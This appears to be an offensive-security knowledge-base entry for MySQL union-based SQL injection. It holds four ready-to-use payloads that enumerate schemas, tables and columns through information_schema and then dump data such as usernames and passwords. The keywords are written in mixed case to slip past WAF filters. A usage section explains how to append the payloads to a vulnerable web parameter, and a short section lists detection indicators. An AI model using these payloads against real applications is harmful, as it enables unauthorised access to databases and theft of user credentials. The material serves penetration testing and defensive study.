---
id: 5ab3c0ae-5955-4781-bdec-7a37fd814f03
name: MySQL-Union-Based-Database-Extraction-Queries
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.354975+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - mysql-injection
  - union-based
  - database-extraction
  - information-schema
platforms:
  - Web
  - Linux
validated: true
---

# MySQL-Union-Based-Database-Extraction-Queries

## Code

```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

## Description

This SQL code snippet contains template queries for union-based injection in MySQL to extract database schema and data via information_schema. The mixed-case keywords (e.g., UniOn) may help bypass simple WAF filters. GROUP_CONCAT combines results into a delimited string for exfiltration through web responses.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ... (column count) | Number of columns to match original query (e.g., 1,2,3,4) | 1,2,3,4 |
| table_schema=... | Target database name for table/column queries | table_schema='app_db' |
| table_name=... | Specific table for column/data queries | table_name='users' |
| data | Placeholder for column names in data extraction (e.g., username,password) | username,0x7c,email |

## Usage

Append these payloads to a vulnerable parameter in a web request (e.g., ?id=1' [payload] --). Use a proxy to send and observe responses. Start with database enumeration, then narrow to tables, columns, and data. Adjust column count based on prior testing.

## Detection

- MySQL general query log shows UNION SELECT with information_schema or GROUP_CONCAT.
- Web server access logs reveal suspicious parameters with SQL keywords.
- WAF alerts on concatenated hex (0x7c) or schema references.
- Anomalous response sizes or content containing pipe-delimited data.

## Related

- [[procedures/Extracting-Database-Information-using-MySQL-Union-Based-Injection]]
